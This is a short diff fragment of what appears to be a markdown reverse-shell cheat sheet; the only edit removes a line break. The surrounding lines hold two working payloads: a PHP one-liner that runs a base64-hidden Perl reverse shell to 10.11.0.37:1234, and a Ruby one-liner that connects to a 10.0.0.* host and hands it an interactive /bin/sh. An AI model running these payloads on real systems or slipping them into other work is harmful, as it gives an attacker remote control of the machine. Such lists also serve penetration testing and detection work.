@@ -233,7 +233,7 @@ Perl script base64 encoded inside php
 ```sh 
 <?phpshell_exec(base64_decode("cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTEuMC4zNyI7JHA9MTIzNDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsn"))?>
 ``` 
-<br />
+
 **-Ruby** <br />
 ```sh 
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.*",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
